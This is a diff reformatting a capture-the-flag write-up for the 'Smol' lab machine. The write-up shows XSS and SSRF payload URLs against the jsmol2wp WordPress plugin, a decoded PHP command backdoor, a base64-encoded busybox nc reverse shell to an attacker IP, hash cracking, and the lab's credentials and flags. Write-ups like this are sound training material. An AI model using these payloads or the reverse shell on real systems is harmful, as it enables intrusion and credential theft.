@@ -19,7 +19,7 @@ Table of Contents
 
     Conclusion
 
-1. Reconnaissance and Initial Enumeration
+# 1. Reconnaissance and Initial Enumeration
 
 The initial phase involved gathering information about the target machine, 10.10.231.99.
 Nmap Scan
@@ -106,18 +106,18 @@ To specifically identify vulnerabilities within the WordPress installation, wpsc
 wpscan --url http://www.smol.thm --api-token REDACTED
 
 WPScan was instrumental in identifying potential vulnerabilities, leading to the discovery of the exploitable jsmol2wp plugin.
-2. WordPress Vulnerabilities and Initial Access
+# 2. WordPress Vulnerabilities and Initial Access
 
 Further investigation focused on the WordPress installation, leveraging insights from wpscan to identify and exploit vulnerabilities.
 jsmol2wp Plugin Vulnerabilities
 
 Guided by wpscan's output and subsequent manual inspection, the jsmol2wp plugin was confirmed to be installed and vulnerable to both Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF).
 
-XSS Vulnerability (Example Payload):
+# XSS Vulnerability (Example Payload):
 
 http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
 
-SSRF Vulnerability (Target Payload):
+# SSRF Vulnerability (Target Payload):
 
 http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
@@ -155,7 +155,7 @@ Which, after resolving the octal and hexadecimal escape sequences, translates to
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 
 This backdoor allows for arbitrary command execution on the server by passing commands via the cmd GET parameter.
-3. Gaining a Reverse Shell
+# 3. Gaining a Reverse Shell
 
 With the command execution vulnerability confirmed, the next objective was to establish a persistent and interactive reverse shell on the target system.
 Crafting and Executing the Reverse Shell Payload
@@ -164,8 +164,8 @@ A busybox nc reverse shell payload was constructed. To ensure proper execution t
 
 Reverse Shell Payload (Encoded for URL):
 
-echo "busybox nc 10.6.48.108 4445 -e sh" | base64
-# Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo
+echo "busybox nc 10.6.48.108 4445 -e sh" | base64 <- Change your attckers IP
+Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo
 
 The encoded payload was then executed via the cmd parameter in the URL:
 
@@ -190,7 +190,7 @@ To gain a fully interactive shell, a Python PTY was spawned from the existing sh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 This established a fully functional shell, ready for further enumeration and privilege escalation.
-4. Privilege Escalation to diego
+# 4. Privilege Escalation to diego
 
 The next phase involved escalating privileges from the www-data user to a higher-privileged account.
 MySQL Database Access
@@ -198,7 +198,7 @@ MySQL Database Access
 The wpuser credentials obtained from wp-config.php were used to access the MySQL database.
 
 mysql -u wpuser -p
-# Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
+Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
 
 Dumping wp_users Table
 
@@ -221,11 +221,11 @@ The query returned the following user information and their password hashes:
 |  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
 
-Cracking diego's Password
+# Cracking diego's Password
 
 The hash for the user diego ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1) was extracted and saved to a file. John the Ripper was then used with the phpass format and the rockyou.txt wordlist to crack the password.
 
-# Save diego's hash to a file, e.g., diego_hash.txt
+Save diego's hash to a file, e.g., diego_hash.txt
 john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt
 
 The cracked password for diego was found to be sandiegocalifornia.
@@ -241,7 +241,7 @@ After successfully switching, the user.txt flag was located in diego's home dire
 cat user.txt
 
 User Flag: 45edaec653ff9ee06236b7ce72b86963
-5. Privilege Escalation to think
+# 5. Privilege Escalation to think
 
 Further enumeration was performed to identify a path to higher privileges.
 Locating think's SSH Private Key
@@ -263,7 +263,7 @@ Finally, SSH was used to log in as think using the private key.
 ssh -i think_id_rsa think@10.10.109.27
 
 This granted a shell as the user think.
-6. Privilege Escalation to xavi
+# 6. Privilege Escalation to xavi
 
 The next step involved finding credentials for another user to continue the privilege escalation chain.
 Discovering and Cracking wordpress.old.zip
@@ -299,7 +299,7 @@ With xavi's credentials, it was possible to switch user from think to xavi.
 su xavi
 Password: P@ssw0rdxavi@
 
-7. Privilege Escalation to root
+# 7. Privilege Escalation to root
 
 This was the final stage of the penetration test, aiming to achieve full root control of the machine.
 Checking xavi's Sudo Privileges
@@ -330,7 +330,7 @@ cd /root
 cat root.txt
 
 Root Flag: bf89ea3ea01992353aef1f576214d4e4
-8. Conclusion
+# 8. Conclusion
 
 The Smol.thm machine was successfully exploited by chaining multiple vulnerabilities and privilege escalation techniques. The process involved:
 
